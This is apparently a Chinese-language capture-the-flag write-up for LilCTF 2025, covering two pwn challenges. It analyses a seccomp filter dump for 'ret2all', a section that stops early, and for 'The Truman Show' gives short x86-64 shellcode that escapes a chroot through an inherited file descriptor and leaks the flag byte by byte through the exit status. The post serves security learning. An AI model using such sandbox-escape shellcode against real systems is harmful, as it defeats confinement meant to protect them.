---
title: LilCTF 2025
date: '2025-09-05 09:48:51'
updated: '2025-09-20 17:23:50'
---
## ret2all
就canary没开其他全开了...

有seccomp规则：

```plain
0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x27 0xc000003e  if (A != ARCH_X86_64) goto 0041
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x24 0xffffffff  if (A != 0xffffffff) goto 0041

这一段是不过的：
 0005: 0x15 0x23 0x00 0x00000005  if (A == fstat) goto 0041
 0006: 0x15 0x22 0x00 0x00000009  if (A == mmap) goto 0041
 0007: 0x15 0x21 0x00 0x0000000a  if (A == mprotect) goto 0041
 0008: 0x15 0x20 0x00 0x00000011  if (A == pread64) goto 0041
 0009: 0x15 0x1f 0x00 0x00000012  if (A == pwrite64) goto 0041
 0010: 0x15 0x1e 0x00 0x00000013  if (A == readv) goto 0041
 0011: 0x15 0x1d 0x00 0x00000014  if (A == writev) goto 0041
 0012: 0x15 0x1c 0x00 0x00000028  if (A == sendfile) goto 0041
 0013: 0x15 0x1b 0x00 0x00000029  if (A == socket) goto 0041
 0014: 0x15 0x1a 0x00 0x0000002a  if (A == connect) goto 0041
 0015: 0x15 0x19 0x00 0x0000002c  if (A == sendto) goto 0041
 0016: 0x15 0x18 0x00 0x0000002e  if (A == sendmsg) goto 0041
 0017: 0x15 0x17 0x00 0x00000031  if (A == bind) goto 0041
 0018: 0x15 0x16 0x00 0x00000032  if (A == listen) goto 0041
 0019: 0x15 0x15 0x00 0x00000038  if (A == clone) goto 0041
 0020: 0x15 0x14 0x00 0x00000039  if (A == fork) goto 0041
 0021: 0x15 0x13 0x00 0x0000003b  if (A == execve) goto 0041
 0022: 0x15 0x12 0x00 0x00000127  if (A == preadv) goto 0041
 0023: 0x15 0x11 0x00 0x00000128  if (A == pwritev) goto 0041
 0024: 0x15 0x10 0x00 0x0000012f  if (A == name_to_handle_at) goto 0041
 0025: 0x15 0x0f 0x00 0x00000130  if (A == open_by_handle_at) goto 0041
 0026: 0x15 0x0e 0x00 0x00000142  if (A == execveat) goto 0041
 0027: 0x15 0x0d 0x00 0x00000147  if (A == preadv2) goto 0041
 0028: 0x15 0x0c 0x00 0x00000148  if (A == pwritev2) goto 0041
 
这一段绕了一下，对fd有限制：
 0029: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0034
 0030: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # write(fd, buf, count)
 0031: 0x15 0x00 0x09 0x00000000  if (A != 0x0) goto 0041
 0032: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
 0033: 0x15 0x06 0x07 0x00000002  if (A == 0x2) goto 0040 else goto 0041
 write系统调用的fd得是2，标准错误输出
 0034: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0040
 0035: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
 0036: 0x25 0x04 0x00 0x00000000  if (A > 0x0) goto 0041
 0037: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0040
 0038: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
 0039: 0x35 0x01 0x00 0x00000001  if (A >= 0x1) goto 0041
 read系统调用的fd得是0，标准输入
 
结果：
 0040: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0041: 0x06 0x00 0x00 0x00000000  return KILL
```

这么看来只能ORW

题目给了输入时候函数栈的rbp的值和返回地址

## The Truman Show
这里把原来的程序路径放到了fd=2的文件描述符当中

![](/images/a6a1ea09bf6375cd654cf9d8d4c5c45b.png)

虽然后面chroot把相对程序而言的根目录改成了新建的一个六字母文件夹，

但是存着原本程序路径的fd=2不受影响，还是可以使用的

![](/images/96f00bc22c3170822ab6f48f9c6ff964.png)

沙盒只允许：mkdir、chroot、openat、read和exit系统调用

程序直接可以输入shellcode执行，限定长度35字节

```python
shellcode=asm('''
    push 2
    pop rdi
    push 0x67616c66 ; 不能有"/"，因为是相对地址
    push rsp
    pop rsi
    mov eax,0x101                
    xor edx,edx
    syscall ; openat(2,str_flag_pointer,0)

    inc edi
    pop rdx
    xor eax,eax
    syscall ; read(3,stack_pointer,0x67616c66)

    mov edi,[rsp-8]
    push 60
    pop rax
    syscall ; exit(char)
''')
```

run.sh当中在程序结束之后还打印了退出值，

```bash
echo $?
```

可以利用exit的参数把openat到栈上的flag一个一个字节打印出来

**openat系统调用**

```c
int openat(int dirfd, const char *pathname, int flags, mode_t mode);
```

1. `dirfd`：
    1. 这是一个文件描述符，指向一个打开的目录。这个参数用于指定路径的相对起始点。如果 `dirfd` 是一个有效的目录文件描述符，那么 `pathname` 参数将相对于这个目录进行解析
    2. 如果 `dirfd` 是 `AT_FDCWD`（即 -100）的话，`pathname` 会被当作绝对路径来处理，就相当于普通的 `open()` 调用
2. `pathname`：
    1. 这是文件的路径，可以是相对路径或者绝对路径。相对路径是相对于 `dirfd` 指定的目录文件描述符
3. `flags`：
    1. 这与 `open()` 的 `flags` 参数相同，指定文件的打开模式（例如 `O_RDONLY`，`O_WRONLY`，`O_RDWR` 等）
    2. 0：只读；1：只写；2：读写
4. `mode`：
    1. 这个参数指定文件权限，通常在创建新文件时使用（例如 `O_CREAT`）。它只有在创建新文件时才有意义

**exit系统调用**

```c
void _exit(int status);
```

